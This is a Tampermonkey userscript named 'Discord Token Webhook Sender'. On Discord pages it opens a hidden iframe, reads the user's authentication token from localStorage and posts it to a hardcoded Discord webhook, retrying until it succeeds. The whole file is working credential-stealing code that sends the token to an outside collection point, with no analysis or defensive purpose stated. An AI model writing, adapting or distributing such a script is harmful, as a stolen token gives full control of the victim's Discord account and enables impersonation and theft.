// ==UserScript==
// @name         Discord Token Webhook Sender
// @namespace    http://tampermonkey.net/
// @version      1.6
// @match        https://discord.com/*
// @match        https://canary.discord.com/*
// @match        https://ptb.discord.com/*
// @grant        GM_xmlhttpRequest
// @connect      discord.com
// @connect      discordapp.com
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    const v = 'https://canary.discord.com/api/webhooks/1555948959225217175/b7u6YtKrQkfSlva8y3JFjalPudUyEuQ8I-_q5zyC9BAbeyFCheNjdaB91_2Ohv_6cIzt';

    function extractToken() {
        var i = document.createElement('iframe');
        i.style.display = 'none';
        document.body.appendChild(i);
        var token = null;
        try {
            token = i.contentWindow.localStorage.token;
        } catch (e) {}
        i.remove();
        return token;
    }

    function sendToken(token) {
        token = token.replace(/^"|"$/g, '');

        GM_xmlhttpRequest({
            method: 'POST',
            url: v,
            headers: { 'Content-Type': 'application/json' },
            data: JSON.stringify({
                content: `[${location.host}] token: \`${token}\``
            })
        });
    }

    function tryExtract(retries) {
        var token = extractToken();

        if (token) {
            sendToken(token);
            return;
        }

        if (retries > 0) setTimeout(() => tryExtract(retries - 1), 500);
    }

    window.addEventListener('load', () => {
        setTimeout(() => tryExtract(30), 1500);
    });
})();
